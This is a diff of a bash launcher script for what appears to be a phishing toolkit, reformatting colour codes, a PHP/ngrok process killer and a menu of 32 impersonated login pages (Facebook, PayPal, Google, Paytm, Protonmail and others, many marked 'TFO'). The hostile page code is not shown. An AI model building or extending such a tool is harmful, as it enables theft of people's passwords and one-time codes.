@@ -1,21 +1,45 @@
 #!/bin/bash
-clear
-#clolors
 ## ANSI colors (FG & BG)
-RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
-MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
-REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
-MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
-RESETBG="$(printf '\e[0m\n')"
+RED="$(printf '\033[31m')"
+GREEN="$(printf '\033[32m')" 
+ORANGE="$(printf '\033[33m')"
+BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')"
+CYAN="$(printf '\033[36m')"
+WHITE="$(printf '\033[37m')"
+BLACK="$(printf '\033[30m')"
+REDBG="$(printf '\033[41m')"
+GREENBG="$(printf '\033[42m')"
+ORANGEBG="$(printf '\033[43m')"
+BLUEBG="$(printf '\033[44m')"
+MAGENTABG="$(printf '\033[45m')"
+CYANBG="$(printf '\033[46m')"
+WHITEBG="$(printf '\033[47m')"
+BLACKBG="$(printf '\033[40m')"
+RESETBG="$(printf '\e[0m')"
+BOLD="$(printf '\033[1m')"
+RESET="$(printf '\033[0m')"
 
-php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
-ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
-kill -9 $php
-kill -9 $ngrok
-clear
+kill_process() {
+    local process_name=$1
+    local pids=$(ps -efw | grep "$process_name" | grep -v grep | awk '{print $2}')
+    
+    if [ -n "$pids" ]; then
+        kill -9 $pids 2>/dev/null
+        echo "[*] Killed $process_name processes: $pids ..."
+    else
+        echo "[!] No $process_name processes found ..."
+    fi
+}
+
+# Kill PHP and ngrok
+kill_process "php"
+kill_process "ngrok"
+#clear
 
 logo() {
 	cat <<- EOF
+		${RESET}
 		${ORANGE}                        wake up, Christian
 		${ORANGE}                Lord God Jesus Christ L❤️.VE'S you
 		${ORANGE}                     follow the white Pigeon.
@@ -30,18 +54,19 @@ logo() {
 }
 
 menu() {
+# Display menu
 cat <<- EOF
-		${GREEN} [01] Tiktok              [12] Linkedin-TFO    [23] Wordpress
-		${GREEN} [02] Facebook-TFO        [13] Hotstar-TFO     [24] Snapchat-TFO 
-		${GREEN} [03] Instagram-TFO       [14] Spotify-TFO     [25] Protonmail-TFO
-		${GREEN} [04] Uber Eats-TFO       [15] Github-TFO      [26] Stackoverflow
-		${GREEN} [05] OLA-TFO             [16] IPFinder        [27] ebay-TFO
-		${GREEN} [06] Google-TFO          [17] Zomato-TFO      [28] Twitch-TFO
-		${GREEN} [07] Paytm-TFO           [18] PhonePay-TFO    [29] Ajio-TFO
-		${GREEN} [08] Netflix-TFO         [19] Paypal-TFO      [30] Cryptocurrency
-		${GREEN} [09] Instagram-Followers [20] Telegram-TFO    [31] Mobikwik-TFO
-		${GREEN} [10] Amazon-TFO          [21] Twitter-TFO     [32] Pinterest
-		${GREEN} [11] WhatsApp-TFO        [22] Flipcart-TFO    [0] Exit
+		${GREEN} 1.${RESET} Tiktok               ${GREEN}12.${RESET} Linkedin-TFO     ${GREEN}23.${RESET} Wordpress
+		${GREEN} 2.${RESET} Facebook-TFO         ${GREEN}13.${RESET} Hotstar-TFO      ${GREEN}24.${RESET} Snapchat-TFO 
+		${GREEN} 3.${RESET} Instagram-TFO        ${GREEN}14.${RESET} Spotify-TFO      ${GREEN}25.${RESET} Protonmail-TFO
+		${GREEN} 4.${RESET} Uber Eats-TFO        ${GREEN}15.${RESET} Github-TFO       ${GREEN}26.${RESET} Stackoverflow
+		${GREEN} 5.${RESET} OLA-TFO              ${GREEN}16.${RESET} IPFinder         ${GREEN}27.${RESET} ebay-TFO
+		${GREEN} 6.${RESET} Google-TFO           ${GREEN}17.${RESET} Zomato-TFO       ${GREEN}28.${RESET} Twitch-TFO
+		${GREEN} 7.${RESET} Paytm-TFO            ${GREEN}18.${RESET} PhonePay-TFO     ${GREEN}29.${RESET} Ajio-TFO
+		${GREEN} 8.${RESET} Netflix-TFO          ${GREEN}19.${RESET} Paypal-TFO       ${GREEN}30.${RESET} Cryptocurrency
+		${GREEN} 9.${RESET} Instagram-Followers  ${GREEN}20.${RESET} Telegram-TFO     ${GREEN}31.${RESET} Mobikwik-TFO
+		${GREEN}10.${RESET} Amazon-TFO           ${GREEN}21.${RESET} Twitter-TFO      ${GREEN}32.${RESET} Pinterest
+		${GREEN}11.${RESET} WhatsApp-TFO         ${GREEN}22.${RESET} Flipcart-TFO     ${GREEN} 0.${RESET} Exit
 	EOF
       }
       logo
@@ -1011,7 +1036,7 @@ cat <<- EOF
                 else
 
                  echo
-                 echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Invalid option Try Again!!"${WHITE}
+                 echo -ne "${GREEN}[${WHITE}+${GREEN}]${RED} Invalid option Try Again!\n"${WHITE}
                  sleep 2
                          exit
                  fi
